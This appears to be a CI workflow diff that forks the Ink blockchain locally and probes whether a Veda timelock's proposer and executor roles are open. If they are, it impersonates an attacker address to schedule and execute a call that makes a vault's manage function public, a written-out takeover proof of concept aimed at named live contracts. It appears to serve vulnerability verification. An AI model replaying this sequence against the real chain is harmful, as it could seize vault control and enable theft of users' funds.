@@ -1,0 +1,105 @@
+name: veda-ink-timelock-open-role
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: stable
+      - name: Inspect open timelock roles and conditionally prove local takeover
+        shell: bash
+        run: |
+          set -euo pipefail
+          RPC="https://rpc-gel.inkonchain.com"
+          LOCAL="http://127.0.0.1:8545"
+          anvil --fork-url "$RPC" --port 8545 --silent >anvil-ink-timelock.log 2>&1 &
+          PID=$!
+          trap 'kill "$PID" 2>/dev/null || true' EXIT
+          for _ in $(seq 1 90); do cast chain-id --rpc-url "$LOCAL" >/dev/null 2>&1 && break; sleep 1; done
+          cast chain-id --rpc-url "$LOCAL" >/dev/null
+          python3 - <<'PY'
+          import json, subprocess, time, traceback
+          RPC="http://127.0.0.1:8545";ATTACKER="0x1111111111111111111111111111111111111111";ZERO="0x0000000000000000000000000000000000000000"
+          TIMELOCK="0xfde306767ce0abb3d60d347672b1d7ed766a58c2"
+          PRODUCTS={
+            "balanced":{"authority":"0x3E8B0ee1D05267fE9F8d2b1f8CB48F2e23d69c6B","vault":"0xcaae49fb7f74cCFBE8A05E6104b01c097a78789f"},
+            "boosted":{"authority":"0x1F53135155d6fF516bCcfDd9424fcdB8AD1eFB77","vault":"0xDbD87325D7b1189Dcc9255c4926076fF4a96A271"},
+          }
+          def run(*a,check=False):
+            p=subprocess.run([str(x) for x in a],text=True,capture_output=True)
+            if check and p.returncode:raise RuntimeError({"cmd":a,"stderr":p.stderr,"stdout":p.stdout})
+            return {"ok":p.returncode==0,"stdout":p.stdout.strip(),"stderr":p.stderr.strip(),"returncode":p.returncode}
+          def call(to,sig,*a,frm=None):
+            cmd=["cast","call",to,sig,*map(str,a),"--rpc-url",RPC]
+            if frm:cmd += ["--from",frm]
+            return run(*cmd)
+          def value(to,sig,*a):
+            r=call(to,sig,*a)
+            if not r["ok"]:raise RuntimeError(r)
+            return int(r["stdout"].split()[0],0)
+          def text(to,sig,*a):return call(to,sig,*a)["stdout"].split()[0]
+          def send(frm,to,sig,*a):
+            return run("cast","send","--unlocked","--from",frm,to,sig,*a,"--rpc-url",RPC,"--json")
+          def rpc(method,*params):return run("cast","rpc",method,*params,"--rpc-url",RPC)
+          out={"generated_at_unix":int(time.time()),"block":int(run("cast","block-number","--rpc-url",RPC)["stdout"]),"timelock":TIMELOCK,"roles":{},"direct_probes":{},"products":{},"takeover_attempts":[],"flags":[],"errors":[]}
+          try:
+            version=call(TIMELOCK,"version()(string)");out["version"]=version
+            out["min_delay"]=value(TIMELOCK,"getMinDelay()(uint256)")
+            role_sigs={"DEFAULT_ADMIN_ROLE":"DEFAULT_ADMIN_ROLE()(bytes32)","TIMELOCK_ADMIN_ROLE":"TIMELOCK_ADMIN_ROLE()(bytes32)","PROPOSER_ROLE":"PROPOSER_ROLE()(bytes32)","EXECUTOR_ROLE":"EXECUTOR_ROLE()(bytes32)","CANCELLER_ROLE":"CANCELLER_ROLE()(bytes32)"}
+            role_ids={}
+            for n,s in role_sigs.items():
+              rr=call(TIMELOCK,s)
+              if rr["ok"]:role_ids[n]=rr["stdout"].split()[0]
+            out["role_ids"]=role_ids
+            for n,rid in role_ids.items():
+              out["roles"][n]={
+                "zero":call(TIMELOCK,"hasRole(bytes32,address)(bool)",rid,ZERO),
+                "attacker":call(TIMELOCK,"hasRole(bytes32,address)(bool)",rid,ATTACKER),
+                "timelock":call(TIMELOCK,"hasRole(bytes32,address)(bool)",rid,TIMELOCK),
+                "admin_role":call(TIMELOCK,"getRoleAdmin(bytes32)(bytes32)",rid),
+              }
+            # Simulate direct schedule and execute from the attacker against a harmless hash first.
+            salt=run("cast","keccak","veda-ink-open-role-probe")["stdout"];pred="0x"+"00"*32
+            data=run("cast","calldata","setPublicCapability(address,bytes4,bool)",PRODUCTS["balanced"]["vault"],run("cast","sig","manage(address,bytes,uint256)")["stdout"],"true")["stdout"]
+            out["direct_probes"]["schedule_attacker"]=call(TIMELOCK,"schedule(address,uint256,bytes,bytes32,bytes32,uint256)",PRODUCTS["balanced"]["authority"],0,data,pred,salt,out["min_delay"],frm=ATTACKER)
+            out["direct_probes"]["execute_unscheduled_attacker"]=call(TIMELOCK,"execute(address,uint256,bytes,bytes32,bytes32)(bytes)",PRODUCTS["balanced"]["authority"],0,data,pred,salt,frm=ATTACKER)
+            out["direct_probes"]["grant_proposer_attacker"]=call(TIMELOCK,"grantRole(bytes32,address)",role_ids.get("PROPOSER_ROLE","0x"+"00"*32),ATTACKER,frm=ATTACKER)
+            # Verify the Timelock itself is actually authorised to change each in-scope authority.
+            manage_sel=run("cast","sig","manage(address,bytes,uint256)")["stdout"]
+            for n,p in PRODUCTS.items():
+              can=call(p["authority"],"canCall(address,address,bytes4)(bool)",TIMELOCK,p["authority"],run("cast","sig","setPublicCapability(address,bytes4,bool)")["stdout"])
+              owner=call(p["authority"],"owner()(address)")
+              before=call(p["authority"],"isCapabilityPublic(address,bytes4)(bool)",p["vault"],manage_sel)
+              out["products"][n]={"authority_owner":owner,"timelock_can_set_public":can,"manage_public_before":before}
+            proposer_open=out["direct_probes"]["schedule_attacker"]["ok"]
+            if proposer_open:
+              rpc("anvil_impersonateAccount",ATTACKER);rpc("anvil_setBalance",ATTACKER,"0x3635c9adc5dea00000")
+              sr=send(ATTACKER,TIMELOCK,"schedule(address,uint256,bytes,bytes32,bytes32,uint256)",PRODUCTS["balanced"]["authority"],0,data,pred,salt,out["min_delay"]);out["takeover_attempts"].append({"step":"schedule","result":sr})
+              rpc("evm_increaseTime",hex(out["min_delay"]+1));rpc("evm_mine")
+              er=send(ATTACKER,TIMELOCK,"execute(address,uint256,bytes,bytes32,bytes32)(bytes)",PRODUCTS["balanced"]["authority"],0,data,pred,salt);out["takeover_attempts"].append({"step":"execute","result":er})
+              after=call(PRODUCTS["balanced"]["authority"],"isCapabilityPublic(address,bytes4)(bool)",PRODUCTS["balanced"]["vault"],manage_sel);out["products"]["balanced"]["manage_public_after"]=after
+              if er["ok"] and "true" in after["stdout"].lower():out["flags"].append({"type":"PERMISSIONLESS_TIMELOCK_AUTHORITY_TAKEOVER","product":"balanced","min_delay":out["min_delay"]})
+          except Exception as e:
+            out["errors"].append({"error":repr(e),"traceback":traceback.format_exc()})
+          with open("veda-ink-timelock-open-role.json","w",encoding="utf-8") as f:json.dump(out,f,indent=2,sort_keys=True);f.write("\n")
+          print(json.dumps({"min_delay":out.get("min_delay"),"roles":{n:{k:v.get("stdout") for k,v in x.items()} for n,x in out["roles"].items()},"direct_probes":{n:{"ok":r.get("ok"),"stderr":r.get("stderr"),"stdout":r.get("stdout")} for n,r in out["direct_probes"].items()},"products":out["products"],"flags":out["flags"],"errors":out["errors"]},indent=2,sort_keys=True))
+          PY
+      - name: Upload Ink timelock proof
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: veda-ink-timelock-open-role
+          path: |
+            veda-ink-timelock-open-role.json
+            anvil-ink-timelock.log
+          if-no-files-found: error
+          retention-days: 1
